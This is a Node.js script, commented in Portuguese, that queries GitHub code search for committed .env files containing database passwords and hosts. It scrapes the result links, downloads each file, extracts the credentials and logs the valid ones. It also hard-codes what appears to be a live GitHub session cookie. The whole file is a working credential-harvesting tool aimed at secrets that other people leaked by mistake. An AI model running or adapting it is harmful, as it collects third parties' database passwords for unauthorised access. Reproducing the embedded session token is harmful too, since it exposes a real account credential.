//Antes de executar instalar axios e cheerio com npm install axios cheerio

const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');
const { getData, getDbConfigData, analyseConfigData, isValidConfigData } = require('./regexTests');

//Query que se mete na procura do GitHub
const query = "path:**/.env db_password= db_host="
const encodedQuery = encodeURIComponent(query);
//Apenas para a primeira página &p=1
const url = `https://github.com/search?q=${encodedQuery}&type=code&p=1`;

const cookies = '_octo=GH1.1.338388154.1708457847; _device_id=6bb985c7f358441a51c1be06aa2a8379; user_session=IB50Cy1acYo8Haf0KGBpb5Q6FZtMJAHSeBOYpmRKks7ss0mK; logged_in=yes; dotcom_user=cunha-joao; tz=Europe%2FLisbon;';

//Baixa a página dos resultados
async function downloadPage() {
    try {
        const response = await axios.get(url, {
            headers: {
                'Cookie': cookies,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
            }
        });
        const html = response.data;

        fs.writeFileSync('resultspage.html', html, 'utf-8');
        console.log('Página HTML baixada com sucesso.');
    } catch (error) {
        console.error('Erro ao baixar a página:', error);
    }
}

// Filtra os Urls com ficheiros .env
function findFileUrl() {
    try {
        const html = fs.readFileSync('resultsPage.html', 'utf-8');
        const $ = cheerio.load(html);
        const links = new Set();

        $('a').each((index, element) => {
            const href = $(element).attr('href');
            if (href && href.includes('.env#')) {
                // Remove o fragmento de linha (tudo após e incluindo '#')
                const cleanedHref = href.split('#')[0];
                // Adiciona https://github.com/ antes dos links relativos
                const completeUrl = `https://github.com${cleanedHref}`;
                links.add(completeUrl);
            }
        });

        fs.writeFileSync('envLinks.txt', Array.from(links).join('\n'), 'utf-8');
        console.log('Links encontrados e guardados com sucesso.');
    } catch (error) {
        console.error('Erro ao processar o arquivo HTML:', error);
    }
}

// Função para aguardar um período de tempo (ms)
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Função para guardar o conteúdo dos Urls
async function processEnvLinks() {
    try {
        const links = fs.readFileSync('envLinks.txt', 'utf-8').split('\n').filter(Boolean);

        for (const link of links) {
            console.log(`Processing link: ${link}`);
            const fileData = await getData(link);

            if (fileData) {
                let data = getDbConfigData(fileData);
                let validData = analyseConfigData(data);
                let isValid = isValidConfigData(validData);

                if (isValid) {
                    console.log(`Valid Data from ${link}:`, validData);
                } else {
                    console.log(`Data from ${link} is not valid.`);
                }
            }
            // Aguardar 10 segundos (5000 ms) antes de processar o próximo link
            await sleep(10000);
        }
    } catch (error) {
        console.error('Error:', error.message);
    }
}

downloadPage().then(findFileUrl).then(processEnvLinks);
